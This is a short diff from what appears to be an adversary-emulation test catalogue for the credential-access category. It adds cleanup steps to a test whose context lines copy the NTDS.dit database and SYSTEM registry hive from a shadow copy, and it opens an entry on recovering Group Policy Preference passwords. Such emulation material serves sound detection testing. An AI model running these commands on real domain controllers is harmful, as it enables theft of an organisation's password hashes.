@@ -19602,6 +19602,10 @@ credential-access:
           copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
           copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
           reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+        cleanup_command: |
+          rm "#{extract_path}\ntds.dit"
+          rm "#{extract_path}\VSC_SYSTEM_HIVE"
+          rm "#{extract_path}\SYSTEM_HIVE"
     - name: GPP Passwords (findstr)
       description: 'Look for the encrypted cpassword value within Group Policy Preference
         files on the Domain Controller. This value can be decrypted with gpp-decrypt
